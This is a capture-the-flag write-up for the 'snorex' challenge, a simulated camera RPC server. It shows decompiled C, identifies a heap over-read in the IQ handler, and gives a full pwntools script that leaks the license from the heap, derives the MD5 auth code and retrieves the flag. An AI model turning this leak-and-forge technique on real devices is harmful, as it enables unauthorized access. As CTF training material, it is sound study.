# Snorex Sonia

## Synopsis
Snore is an advanced difficulity challenge that features leaking `heap` and using it to get the flag.

## Analysis

Canary  : ✓
NX      : ✓
PIE     : ✓
Fortify : ✘
RelRO   : Full

This program is a simple socket server of a locked **snorex** camera, that we need to unlock.

```C
55555555630d    int32_t main()

555555556316        void* fsbase
555555556316        int64_t canary = *(fsbase + 0x28)
555555556325        load_config()
55555555633b        int32_t rbx_1 = time(nullptr) ^ getpid()
55555555634b        srand(x: (cur_time_seconds * 2) ^ rbx_1)
55555555636f        pthread_t th
55555555636f        int32_t result
55555555636f        
55555555636f        if (pthread_create(&th, 0, rpc_server_thread, 0) == 0)
555555556393            pthread_join(th, 0)
555555556398            result = 0
55555555636f        else
55555555637b            perror(s: "pthread_create")
555555556380            result = 1
555555556380        
5555555563a1        *(fsbase + 0x28)
5555555563a1        
5555555563aa        if (canary == *(fsbase + 0x28))
5555555563b6            return result
5555555563b6        
5555555563ac        __stack_chk_fail()
5555555563ac        noreturn
```

As we can see from disassembly above, this program's loading config and starting a thread, i decided to reverse load_config() first

```C
5555555554af    char* refresh_secrets()

5555555554c2        cur_time_seconds = time(nullptr)
5555555554dc        memset(&pseudo_random, 0, 15)
5555555554f5        int32_t _/dev/urandom = open(file: "/dev/urandom", oflag: 0)
5555555554f5        
555555555501        if (_/dev/urandom s>= 0)
55555555551c            ssize_t r = read(fd: _/dev/urandom, buf: &pseudo_random, nbytes: 15) // generates true random
555555555525            return close(fd: _/dev/urandom)
555555555525        
55555555553b        char* result = srand(x: getpid() ^ cur_time_seconds)
55555555553b        
55555555556b        for (size_t i = 0; i u<= 0xe; i += 1)
55555555555c            result = i + &pseudo_random // overwriting it with pseudo-random
55555555555f            *result = rand()
55555555555f        
555555555573        return result


555555555574    void* usrMgr_getEncryptDataStr()

55555555557c        void* fsbase
55555555557c        int64_t canary = *(fsbase + 0x28)
555555555590        void* malloc_addr = malloc(bytes: 0x108)
55555555559e        void* result
55555555559e        
55555555559e        if (malloc_addr != 0)
5555555555aa            refresh_secrets()
5555555555c0            memset(malloc_addr, 0, 264)
5555555555db            memcpy(malloc_addr, "SNOREX1", 7)
555555555650            char rand_hex[0x1f]
555555555650            
555555555650            for (size_t i = 0; i u<= 14; i += 1)
5555555555fb                uint32_t rax_6 = zx.d(*(i + &pseudo_random))
55555555561e                rand_hex[i * 2] = (*"0123456789abcdef")[zx.q(rax_6 u>> 4)]
555555555642                rand_hex[i * 2 + 1] = *((zx.q(rax_6) & 0xf) + "0123456789abcdef")
555555555642            
555555555652            rand_hex[0x1e] = 0
555555555695            snprintf(s: malloc_addr + 8, maxlen: 256, format: "1\n%s\n%u\n\n%s\n%s\n", 
555555555695                &serial, zx.q(cur_time_seconds), &mac, &rand_hex)
55555555569e            result = malloc_addr
55555555559e        else
5555555555a0            result = nullptr
5555555555a0        
5555555556a6        *(fsbase + 0x28)
5555555556a6        
5555555556af        if (canary == *(fsbase + 0x28))
5555555556b7            return result
5555555556b7        
5555555556b1        __stack_chk_fail()
5555555556b1        noreturn


555555556211    int64_t load_config()

555555556219        port = 3500
555555556231        char* s = getenv(name: "SNOREX_SERIAL")
555555556231        
555555556245        if (s == 0 || *s == 0)
55555555624e            s = "FAKEZ-2K-CAM01"
55555555624e        
555555556268        strncpy(&serial, s, 15)
55555555627c        char* m = getenv(name: "SNOREX_MAC")
55555555627c        
555555556290        if (m == 0 || *m == 0)
555555556299            m = "AB:12:4D:7C:20:10"
555555556299        
5555555562b3        strncpy(&mac, m, 17)
5555555562c2        pthread_mutex_lock(mutex: &g_usr_mutex)
5555555562cc        usrMgr_getEncryptDataStr_DATA = usrMgr_getEncryptDataStr()
5555555562dd        pthread_mutex_unlock(mutex: &g_usr_mutex)
55555555630c        return fprintf(stream: stderr, format: "[snorex] rpc port=%u\n", zx.q(port), 
55555555630c            "[snorex] rpc port=%u\n")
```

By the end of load_config() fuction, we get license key in this format:
```
SNOREX1
FAKEZ-2K-CAM01
current time in seconds

AB:12:4D:7C:20:10
random hex
```

It uses pseudo random, that is easily guessable, but we cannot guess MAC or serial, so we need to go deeper

```C
5555555556b8    int64_t PasswdFind_getAuthCode(char* out_hex16)

5555555556c4        void* fsbase
5555555556c4        int64_t canary = *(fsbase + 0x28)
5555555556d7        *out_hex16 = 0
5555555556e4        pthread_mutex_lock(mutex: &g_usr_mutex)
5555555556e9        uint64_t usrMgr_getEncryptDataStr_DATA_1 = usrMgr_getEncryptDataStr_DATA
5555555556e9        
5555555556f9        if (usrMgr_getEncryptDataStr_DATA_1 != 0)
555555555759            unsigned char digest[0x10]
555555555759            MD5(usrMgr_getEncryptDataStr_DATA_1 + 8, 
555555555759                strnlen(usrMgr_getEncryptDataStr_DATA_1 + 8, 0x100), &digest, 
555555555759                usrMgr_getEncryptDataStr_DATA_1 + 8)
555555555759            
5555555557cf            for (int i = 0; i s<= 7; i += 1)
55555555576c                uint8_t rax_9 = digest[sx.q(i)]
55555555579a                out_hex16[sx.q(i * 2)] = (*"0123456789abcdef")[sx.q(zx.d(rax_9 u>> 4))]
5555555557c5                *(sx.q(i * 2) + 1 + out_hex16) =
5555555557c5                    (*"0123456789abcdef")[sx.q(zx.d(rax_9) & 0xf)]
5555555557c5            
5555555557d9            out_hex16[0x10] = 0
5555555557e6            pthread_mutex_unlock(mutex: &g_usr_mutex)
5555555556f9        else
555555555711            memcpy(out_hex16, "0000000000000000", 0x11)
555555555720            pthread_mutex_unlock(mutex: &g_usr_mutex)
555555555720        
5555555557f8        if (canary == *(fsbase + 0x28))
555555555800            return canary - *(fsbase + 0x28)
555555555800        
5555555557fa        __stack_chk_fail()
5555555557fa        noreturn


555555555801    int handle_auth(uint32_t cmd, uint8_t* buf, uint32_t len, int fd)

555555555816        void* fsbase
555555555816        int64_t canary = *(fsbase + 0x28)
555555555829        int result
555555555829        uint32_t hdr[0x2]
555555555829        
555555555829        if (cmd == 0)
55555555582f            void* rax_1 = usrMgr_getEncryptDataStr()
55555555582f            
55555555583d            if (rax_1 != 0)
555555555853                pthread_mutex_lock(mutex: &g_usr_mutex)
555555555858                uint64_t usrMgr_getEncryptDataStr_DATA_1 = usrMgr_getEncryptDataStr_DATA
555555555867                usrMgr_getEncryptDataStr_DATA = rax_1
555555555878                pthread_mutex_unlock(mutex: &g_usr_mutex)
555555555878                
555555555882                if (usrMgr_getEncryptDataStr_DATA_1 != 0)
55555555588b                    free(mem: usrMgr_getEncryptDataStr_DATA_1)
55555555588b                
55555555589a                hdr[0] = htonl(0)
5555555558a7                hdr[1] = htonl(0)
5555555558bb                result = write_full(fd, buf: &hdr, len: 8)
55555555583d            else
55555555583f                result = -1
555555555829        else if (cmd != 1)
5555555559bb            result = -1
5555555558c9        else if (buf == 0 || len u<= 0xf)
5555555558dc            result = -1
5555555558da        else
5555555558ed            char expected[0x11]
5555555558ed            PasswdFind_getAuthCode(out_hex16: &expected)
55555555590c            int32_t rax_8
55555555590c            rax_8.b = memcmp(buf, &expected, 0x10) == 0
55555555590f            uint32_t rax_9 = zx.d(rax_8.b)
555555555919            char* flag_1
555555555919            
555555555919            if (rax_9 == 0)
55555555592c                flag_1 = "Unauthorized\n"
555555555919            else
555555555925                flag_1 = getenv(name: "FLAG")
555555555925            
555555555933            void* flag = flag_1
555555555933            
555555555947            if (flag == 0 || *flag == 0)
555555555950                flag = "flag{now_repeat_against_remote_server}"
555555555950            
555555555960            uint32_t rlen = strlen(flag)
555555555967            uint32_t rax_13
555555555967            rax_13.b = rax_9 == 0
555555555974            hdr[0] = htonl(zx.q(rax_13.b))
555555555981            hdr[1] = htonl(zx.q(rlen))
555555555981            
55555555599c            if (write_full(fd, buf: &hdr, len: 8) == 0)
5555555559b4                result = write_full(fd, buf: flag, len: zx.q(rlen))
55555555599c            else
55555555599e                result = -1
5555555559c4        *(fsbase + 0x28)
5555555559c4        
5555555559cd        if (canary == *(fsbase + 0x28))
5555555559d5            return result
5555555559d5        
5555555559cf        __stack_chk_fail()
5555555559cf        noreturn


5555555559d6    int64_t MI_IQSERVER_GetApi(uint8_t* in_data, uint32_t in_length, struct MI_IQ_BUFFER* out)

5555555559e9        void* fsbase
5555555559e9        int64_t canary = *(fsbase + 0x28)
5555555559e9        
555555555a51        if (in_data != 0 && out != 0 && out->heap_ptr != 0 && in_length u> 3
555555555a51                && (zx.w(in_data[1]) | (zx.d(*in_data) << 8).w) == 0x2803)
555555555a78            uint16_t rax_21 = zx.w(in_data[3]) | (zx.d(in_data[2]) << 8).w
555555555a88            int32_t raw_len = (zx.d(rax_21) + 2) << 2 // VULNERABLE, WE CAN LEAK 1024 BYTES OF HEAP
555555555a88            
555555555a92            if (raw_len u> 1024)
555555555a94                raw_len = 1024
555555555a94            
555555555aa2            out->curr_length = raw_len
555555555aa9            uint8_t* heap_ptr = out->heap_ptr
555555555ac6            memcpy(heap_ptr, "IQDA", 4)
555555555ae5            memcpy(&heap_ptr[4], "CH01", 4)
555555555af4            uint32_t meta[0x4]
555555555af4            meta[0] = htonl(0x3e80)
555555555b01            meta[1] = htonl(0x249f00)
555555555b0f            meta[2] = htonl(zx.q(rax_21))
555555555b23            meta[3] = htonl(zx.q(time(nullptr)))
555555555b32            int64_t rdx_3 = meta[2].q
555555555b36            *(heap_ptr + 8) = meta[0].q
555555555b39            *(heap_ptr + 16) = rdx_3
555555555b39            
555555555b68            for (void* i = &data_18; i u<= 63; i += 1)
555555555b5c                *(i + heap_ptr) = (i.b & 31) - 128
555555555b5c            
555555555b99            for (void* i = nullptr; i u<= 191; i += 1)
555555555b8a                *(i + heap_ptr + 64) = rand()
555555555b8a        
555555555bb1        if (canary == *(fsbase + 0x28))
555555555bb9            return canary - *(fsbase + 0x28)
555555555bb9        
555555555bb3        __stack_chk_fail()
555555555bb3        noreturn


555555555bba    int handle_iq(uint32_t cmd, uint8_t* buf, uint32_t len, int fd)

555555555bcf        void* fsbase
555555555bcf        int64_t canary = *(fsbase + 0x28)
555555555be2        int32_t result
555555555be2        
555555555be2        if (cmd == 6)
555555555bf3            void* buf_1 = malloc(bytes: 0x100)
555555555bf3            
555555555c01            if (buf_1 != 0)
555555555c1e                memset(buf_1, 0, 0x100)
555555555c27                struct MI_IQ_BUFFER out
555555555c27                out.heap_ptr = buf_1
555555555c2b                out.max_length = 0x100
555555555c32                out.curr_length = 0
555555555c49                MI_IQSERVER_GetApi(in_data: buf, in_length: len, &out)
555555555c58                uint32_t hdr[0x2]
555555555c58                hdr[0] = htonl(0)
555555555c65                hdr[1] = htonl(zx.q(out.curr_length))
555555555c65                
555555555c80                if (write_full(fd, buf: &hdr, len: 8) != 0)
555555555c89                    free(mem: buf_1)
555555555c8e                    result = -1
555555555c80                else if (out.curr_length == 0)
555555555cd0                    free(mem: buf_1)
555555555cd5                    result = 0
555555555c9a                else if (write_full(fd, buf: buf_1, len: zx.q(out.curr_length)) == 0)
555555555cd0                    free(mem: buf_1)
555555555cd5                    result = 0
555555555cb4                else
555555555cbd                    free(mem: buf_1)
555555555cc2                    result = -1
555555555c01            else
555555555c03                result = -1
555555555be2        else
555555555be4            result = -1
555555555be4        
555555555cde        *(fsbase + 0x28)
555555555cde        
555555555ce7        if (canary == *(fsbase + 0x28))
555555555cef            return result
555555555cef        
555555555ce9        __stack_chk_fail()
555555555ce9        noreturn


555555555cf0    int handle_request(int fd)

555555555cfb        void* fsbase
555555555cfb        int64_t canary = *(fsbase + 0x28)
555555555d22        uint32_t hdr[0x2]
555555555d22        int result
555555555d22        
555555555d22        if (read_full(fd, buf: &hdr, len: 8) == 0)
555555555d33            uint32_t cmd_1 = ntohl(zx.q(hdr[0]))
555555555d40            uint32_t len_1 = ntohl(zx.q(hdr[1]))
555555555d40            
555555555d4f            if (len_1 u<= 1000000)
555555555d5b                void* buf = nullptr
555555555d5b                
555555555d67                if (len_1 == 0)
555555555db4                label_555555555db4:
555555555db4                    int r = 0xffffffff
555555555db4                    
555555555dc5                    if (cmd_1 == 0 || cmd_1 == 1)
555555555ddb                        r = handle_auth(cmd: cmd_1, buf, len: len_1, fd)
555555555dc5                    else if (cmd_1 == 6)
555555555dfa                        r = handle_iq(cmd: cmd_1, buf, len: len_1, fd)
555555555dfa                    
555555555e02                    if (buf != 0)
555555555e0b                        free(mem: buf)
555555555e0b                    
555555555e10                    result = r
555555555d67                else
555555555d74                    buf = malloc(bytes: zx.q(len_1))
555555555d74                    
555555555d7d                    if (buf != 0)
555555555d9f                        if (read_full(fd, buf, len: zx.q(len_1)) == 0)
555555555d9f                            goto label_555555555db4
555555555d9f                        
555555555da8                        free(mem: buf)
555555555dad                        result = -1
555555555d7d                    else
555555555d7f                        result = -1
555555555d4f            else
555555555d51                result = -1
555555555d22        else
555555555d24            result = -1
555555555d24        
555555555e17        *(fsbase + 0x28)
555555555e17        
555555555e20        if (canary == *(fsbase + 0x28))
555555555e28            return result
555555555e28        
555555555e22        __stack_chk_fail()
555555555e22        noreturn
```

So, all we need to do, is leak heap with license, then generate auth code, and finally get the flag.

```PY
from pwn import *
import sys
import hashlib
import argparse

RESET_HEADER = p32(0, endian='big')
AUTH_HEADER = p32(1, endian='big')
IQ_HEADER = p32(6, endian='big')
IQ_PAYLOAD = b'\x28\x03\xff\xff'

def get_auth_code(encrypt_data: bytes) -> str:
    data = encrypt_data[8:].split(b'\x00', 1)[0][:256]
    return hashlib.md5(data).hexdigest()[:16]

def prepare(target):
    p = remote(target[0], int(target[1]), level='error')
    log.success('Preparing some stuff...')
    p.send(RESET_HEADER + p32(0))
    p.close()

def dump_heap(p):
    p.send(RESET_HEADER + p32(0))
    p.send(IQ_HEADER + p32(len(IQ_PAYLOAD), endian='big'))
    p.send(IQ_PAYLOAD)

    # https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/tubes/tube.py#L836
    with p.local(1):
        while True:
            if not p._fillbuffer():
                break

    return p.buffer.get()

def get_license(p):
    l = log.progress('Trying to get license')
    for i in range(1, 25):
        l.status('attemps ' + str(i))
        tmp = dump_heap(p)

        if b'SNOREX1' in tmp:
            l.success('success!')
            tmp = tmp[tmp.find(b'SNOREX1'):]
            parts = tmp.split(b'\x00', 2)
            lcns = parts[0] + b'\x00' + parts[1]
            return lcns
        else:
            continue

    l.failure('whoops! something went wrong...')
    sys.exit()

def get_flag(p, code):
    p.send(AUTH_HEADER + p32(len(code), endian='big'))
    p.send(code.encode())
    flag = p.read()[8:].decode('utf-8')
    return flag

def exploit(p):
    lcsn = get_license(p)
    code = get_auth_code(lcsn)
    log.success(f'Got auth code: {code}')
    flag = get_flag(p, code)
    log.success('Flag: ' + flag)

def main():
    parser = argparse.ArgumentParser(
            prog='exploit',
            description='exploit for snorex (NahamCon CTF)',
            usage='%(prog)s [ip:port]')
    parser.add_argument('target', default="127.0.0.1:3500", nargs='?',
                        help='target ip:port (default 127.0.0.1:3500)')
    args = parser.parse_args()

    if ':' in args.target:
        target = args.target.split(':')
        p = remote(target[0], int(target[1]))
        prepare(target)
        exploit(p)
    else:
        log.failure('invalid ip:port!')

if __name__ == '__main__':
    main()
```

![alt text](image.png)

> I know that this is bad write up, but i have no idea how to make it bettes, i hope you undeerstand at least something.